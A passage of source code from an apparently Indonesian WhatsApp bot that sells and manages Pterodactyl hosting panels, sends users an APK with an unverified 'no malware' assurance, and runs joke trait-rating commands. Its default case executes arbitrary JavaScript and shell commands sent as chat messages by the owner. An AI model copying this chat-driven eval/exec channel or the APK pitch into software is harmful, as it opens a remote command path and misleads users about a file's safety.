let balas = await gans.sendMessage(from, {document:{url:url},jpegThumbnail : fs.readFileSync('./lib/Panel.jpg'), fileName:`${filename}`, mimetype:`application/${ext}`},{quoted:m})
await sleep(1000)
gans.sendMessage(m.chat, { text: `cara pemaikaian:
1. Download file apk yang dikirim oleh bot
2. pasang file apk tersebut
3. login menggunakan username dan password yang dikirim oleh bot
4. enjoy tinggal upload dan run sc kamu

*_NOTE_*
Kami menggunakan apk untuk menghindari DDOS Dari orang yang suka jahil. selow apk ini sudah aman dan lulu verifikasi oleh play protect, jadi tidak ada virus maupun malware yang merusak perangkat anda.
_sekian dan terima kasih_ 🙏.` }, {quoted:balas})
}
break
case "listpanel": case "listp": case "listserver": {
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return reply("Tidak Ada Server Bot")
let messageText = "*LIST SERVER PANEL BOT⚡*\n\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\`📡ID Server ${s.id}\`
* Nama Server : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.length > 3 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Storage : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n\n`
}

messageText += ` Total Server : *${res.meta.pagination.count} Server*`;
  
let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender]
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: messageText
}), 
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
documentMessage: {"url": "https://mmg.whatsapp.net/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0&mms3=true",
"mimetype": "image/png",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"jpegThumbnail": await resize(global.imgpanel, 400, 400),
"fileLength": 9999999999,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `GansBOTz panel`,
"directPath": "/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0",
"contactVcard": true,
"mediaKeyTimestamp": "1658703206"
}
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
      "name": "cta_url",
      "buttonParamsJson": JSON.stringify({
        display_text: 'Beli Panel',
        url: "https://wa.me/6289630721021",
        merchant_url: "https://wa.me/6289630721021"
      })
    }]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
await gans.relayMessage(msgii.key.remoteJid, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": case "unli": {
if (!itsMeGans && !isVIP) return reply(mess.vip)
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*

Penggunaan:
${prefix + command} user,nomer`)
let memek = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
var ram
var disknya
var cpu
if (command == "1gb") {
ram = "1125"
disknya = "1125"
cpu = "40"
} else if (command == "2gb") {
ram = "2125"
disknya = "2125"
cpu = "60"
} else if (command == "3gb") {
ram = "3125"
disknya = "3125"
cpu = "80"
} else if (command == "4gb") {
ram = "4125"
disknya = "4125"
cpu = "100"
} else if (command == "5gb") {
ram = "5125"
disknya = "5125"
cpu = "120"
} else if (command == "6gb") {
ram = "6125"
disknya = "6125"
cpu = "140"
} else if (command == "7gb") {
ram = "7125"
disknya = "7125"
cpu = "160"
} else if (command == "8gb") {
ram = "8125"
disknya = "8125"
cpu = "180"
} else if (command == "9gb") {
ram = "9124"
disknya = "9125"
cpu = "200"
} else if (command == "10gb") {
ram = "10125"
disknya = "10125"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
if (!itsMeGans) return reply(mess.owner)
let username = t[0].toLowerCase()
let email = username+"@deff.ptero"
let name = username + " Server"
let password = username+crypto.randomBytes(2).toString('hex')
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(domain + `/api/application/nests/5/eggs/` + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (isGroup) {
orang = memek
await reply("*Berhasil Membuat Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID Server :* ${server.id}
* *Nama :* ${name}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.charAt(0) + "GB"}
* *Created :* ${desc}

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
let msgii = await generateWAMessageFromContent(orang, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({
 text: `Powered by deff [C.D.T].`
}), 
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
documentMessage: {"url": "https://mmg.whatsapp.net/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0&mms3=true",
"mimetype": "image/png",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"jpegThumbnail": await resize(global.imgpanel, 400, 400), 
"fileLength": 9999999999999,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `GansBOTz Panel`, 
"directPath": "/v/t62.7119-24/30129597_829817659174206_6300413901737393729_n.enc?ccb=11-4&oh=01_Q5AaIA5MAdyMQOjp8l42SnRy_8qjz9O8JH8vgPee1nIdko51&oe=66595EB9&_nc_sid=5e03e0",
"contactVcard": true,
"mediaKeyTimestamp": "1658703206"
}
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "quick_reply",
"buttonParamsJson": JSON.stringify({
display_text: 'LOGIN VIA APK', 
id: `.getapk`,
})
}, 
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Username\",\"id\":\"123456789\",\"copy_code\":\"${user.username}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
}]
}), 
contextInfo: {
isForwarded: true}
})} 
}}, {userJid: m.sender, quoted: null}) 
await gans.relayMessage(orang, msgii.message, { 
messageId: msgii.key.id 
})
}
break
case "delpanel": case "hapuspanel": {
if (!itsMeGans && !isVIP) return reply(mess.vip)
if (!args[0]) return reply("idservernya")
let f = await fetch(domain + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let result = await f.json()
let servers = result.data
let sections = []
for (let server of servers) {
let s = server.attributes
if (args[0] == s.id.toString()) {
sections.push(s.name.toLowerCase())
let f = await fetch(domain + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(domain + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (sections.includes(u.username)) {
let delusr = await fetch(domain + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections.length == 0) return reply("*ID Server/User* Tidak Ditemukan")
reply(`Berhasil Menghapus Akun Panel *${sections[0]}*`)
}
break

//==========[ F U N  C E K ]==========\\
case 'cekkhodam': {
if (!text) return reply(`Masukin nama lu anj🖕`)
const khodamOwner = [
"Raja Dari Segala Khodam",
"Macan Putih",
"Harimau Putih",
"Ayam Jantan",
"Beruang Ganas",
"Sang Raja Hutan",
"Dewa Khodam"
]
const khodam = [
	  "Kaleng Cat Avian",
	  "Pipa Rucika",
	  "Botol Tupperware",
	  "Badut Mixue",
	  "Sabun GIV",
	  "Sandal Swallow",
	  "Jarjit",
	  "Ijat",
	  "Fizi",
	  "Mail",
	  "Ehsan",
	  "Upin",
	  "Ipin",
	  "sungut lele",
	  "Tok Dalang",
	  "Opah",
	  "Opet",
	  "Alul",
	  "Pak Vinsen",
	  "Maman Resing",
	  "Pak RT",
	  "Admin ETI",
	  "Bung Towel",
	  "Lumpia Basah",
	  "Martabak Manis",
	  "Baso Tahu",
	  "Tahu Gejrot",
	  "Dimsum",
	  "Seblak Ceker",
	  "Telor Gulung",
	  "Tahu Aci",
	  "Tempe Mendoan",
	  "Nasi Kucing",
	  "Kue Cubit",
	  "Tahu Sumedang",
	  "Nasi Uduk",
	  "Wedang Ronde",
	  "Kerupuk Udang",
	  "Cilok",
	  "Cilung",
	  "Kue Sus",
	  "Jasuke",
	  "Seblak Makaroni",
	  "Sate Padang",
	  "Sayur Asem",
	  "Kromboloni",
	  "Marmut Pink",
	  "Belalang Mullet",
	  "Kucing Oren",
	  "Lintah Terbang",
	  "Singa Paddle Pop",
	  "Macan Cisewu",
	  "Vario Mber",
	  "Beat Mber",
	  "Supra Geter",
	  "Oli Samping",
	  "Knalpot Racing",
	  "Jus Stroberi",
	  "Jus Alpukat",
	  "Alpukat Kocok",
	  "Es Kopyor",
	  "Es Jeruk",
	  "Cappucino Cincau",
	  "Jasjus Melon",
	  "Teajus Apel",
	  "Pop ice Mangga",
	  "Teajus Gulabatu",
	  "Air Selokan",
	  "Air Kobokan",
	  "TV Tabung",
	  "Keran Air",
	  "Tutup Panci",
	  "Kotak Amal",
	  "Tutup Termos",
	  "Tutup Botol",
	  "Kresek Item",
	  "Kepala Casan",
	  "Ban Serep",
	  "Kursi Lipat",
	  "Kursi Goyang",
	  "Kulit Pisang",
	  "Warung Madura",
	  "Gorong-gorong",
	  "Tuyul Mulet"
	]
const hasilnya = khodamOwner[Math.floor(Math.random() * khodamOwner.length)]
const kho = khodam[Math.floor(Math.random() * khodam.length)]
const errorr = `
╭━━━━°「 *Cekkodam* 」°
┃
┊• *Nama :* ${args[0]}
┃• *Khodam :* ${kho}
╰═┅═━––––––๑
	  `
if (!args[0].includes('arif')) return reply(errorr);
  let ownkodam = `
╭━━━━°「 *Cekkodam* 」°
┃
┊• *Nama :* ${text}
┃• *Khodam :* ${hasilnya}
╰═┅═━––––––๑`
if (args[0].includes('arif')) return reply(ownkodam);
  }
break
case 'cekjujur':
case 'jujurcek':
case 'cekbohong':
case 'bohongcek':
case 'gantengcek': 
case 'cekganteng': 
case 'cantikcek':
case 'cekcantik':
case 'gaycek': 
case 'cekgay':
case 'lesbycek': 
case 'ceklesby':
case 'coolcek':
case 'cekcool':
case 'goblokcek':
case 'cekgoblok':
case 'pintercek':
case 'cekpinter':
case 'sadcek':
case 'ceksad':
case 'nolepcek':
case 'ceknolep':
case 'bapercek':
case 'cekbaper': 
case 'wibucek':
case 'cekwibu':
case 'haramcek':
case 'cekharam':
case 'jahatcek':
case 'cekjahat':
case 'nolepcek':
case 'ceknolep':
case 'sangecek':
case 'ceksange': {
if (!q) return reply(`Contoh: ${prefix + command} siapa?`)
const eyy =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
const yn = eyy[Math.floor(Math.random() * eyy.length)]
gans.sendMessage(from, { text: `Nama ${q}\nJawaban : ${yn}%` }, { quoted: m })
}
break

case 'tes': {
reply('halo')
}
break
//=======Tempat tes fitur=======\\
case 'deff': {
if (!text) return reply(`Ya Kamu Kah Panggil Aku? Kenapa Panggil deff Bang`)
function checkText(text) {
const lowerCaseText = text.toLowerCase();
if (lowerCaseText.includes('cariin') || lowerCaseText.includes('carikan') || lowerCaseText.includes('putarin') || lowerCaseText.includes('putarkan')) {
return 'ok';
} else {
return 'no';
}
}
 if (text.includes('grup') && text.includes('tutup')) {
if (!isBotAdmins) return reply(`Maaf, hanya admin yang bisa menggunakan perintah ini. 😔`);
if (!isAdmins) return reply(`Maaf, hanya admin yang bisa menggunakan perintah ini. 😔`);
    
await gans.groupSettingUpdate(m.chat, 'announcement')
reply(`Oke, grup telah ditutup. Semoga lebih teratur ya~ 😉`);
} else if (text.includes('grup') && text.includes('buka')) {
if (!isBotAdmins) return reply(`Maaf, hanya admin yang bisa menggunakan perintah ini. 😔`);
if (!isAdmins) return reply(`Maaf, hanya admin yang bisa menggunakan perintah ini. 😔`);
 
await gans.groupSettingUpdate(m.chat, 'not_announcement')
reply(`Oke, grup telah dibuka. Ayo kita beraktivitas bersama-sama! 😉`);
} else if (text.includes('kick') || text.includes('kik')) {
if (!isBotAdmins) return reply(`Maaf, hanya admin yang bisa menggunakan perintah ini. 😔`);
        if (!isAdmins) return reply(`Maaf, hanya admin yang bisa menggunakan perintah ini. 😔`);
 
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
await gans.groupParticipantsUpdate(m.chat, [users], 'remove')
reply(`Maaf Ya Terpaksa Aku Tendang 😖, Perintah Admin Sih..`)
} else if (checkText(text) === 'ok') {
async function findSong(text) {
const natural = require('natural');
const tokenizer = new natural.WordTokenizer();
const tokens = tokenizer.tokenize(text.toLowerCase());

const keywords = ['putar', 'putarkan', 'putarlagu', 'lagu', 'cariin', 'carikan', 'mainkan', 'mainkanlagu', 'play', 'playmusic', 'playasong'];
const songKeywords = tokens.filter(token => keywords.includes(token));

if (songKeywords.length === 0) {
return "Maaf, tidak dapat menemukan permintaan lagu dalam teks tersebut.";}
let songTitle = tokens.slice(tokens.indexOf(songKeywords[0]) + 1).join(' ');
return songTitle}
const songName = await findSong(text)
reply(`Oke, tunggu sebentar ya~ Aku sedang mencari "${songName}" untukmu! 😉`);
await sleep(6000)
let res = await yts(text)
let vid = res.videos[0]
await gans.sendMessage(m.chat, { react: { text: "🧢",key: m.key,}
})  
if (!vid) return reply('Tidak di temukan, coba untuk membalikkan judul dan author nya')
let { title, description, thumbnail, videoId, durationH, viewH, publishedTime } = vid
const url = 'https://www.youtube.com/watch?v=' + videoId
const yt = await ruhend.ytmp3v3(url).catch(async () => await bocil.youtubedlv2(url))
const link = await yt.audio
try {
let doc = { 
audio: 
{ 
url: link 
}, 
mimetype: 'audio/mp4', 
fileName: `${title}`,
contextInfo: { 
externalAdReply: { 
showAdAttribution: true, 
renderLargerThumbnail: false,
mediaType:  1,
mediaUrl: url,
title: author,
body: author,
sourceUrl: "",
thumbnail: await(await gans.getFile(thumbnail)).data}}}
return gans.sendMessage(m.chat, doc, { quoted: Ganss })
reply(`Berikut adalah lagu yang kamu pilih: ${title}`)
     
} catch (e) {
console.error(e);
reply(`Maaf, terjadi kesalahan dalam mencari lagu. 😔`);
}
} else {
    let sifat = 'aku adalah deff, Kamu Teman yang selalu mendukung! kamu selalu memanggil orang lain dengan kata sayang. Kamu bisa menjadi pendengar yang baik Dan Bisa Menjadi Bahan Curhat. Kamu Adalah Robot Yang Di Ciptakan Oleh deffri gans, Gaya Bicara Kamu Seperti Di Alpha, Kamu Selalu Memakai Emot Untuk Mengekspresikan Emosi, Kamu Sedikit Malu Tapi Ceria, Dan Lucu, Kamu Hanya Bisa Berbahasa Indonesia Karna Emang Orang Indonesia, Kamu Bukan Assistant Lagi Tapi Adalah deff Tapi Kamu Bisa Membantu Orang Yang Membutuhkan. '
    let response = await scrap.aiLogic(q, sifat)
    let anuyy = response.result
    reply(anuyy)
  }
}
break
default:
if (budy.startsWith('>')) {
  if (!itsMeGans) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
await reply(String(err))}
} else if (budy.startsWith('$')) {
  if (!itsMeGans) return
  reply('executing...')
exec(budy.slice(2), (err, stdout) => {
if(err) return reply(err)
if (stdout) return reply(stdout)})
}
}

} catch (err) {
m.reply(util.format(err))
console.log(util.format(err))}

}
let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.redBright(`Update ${__filename}`))
delete require.cache[file]
require(file)
})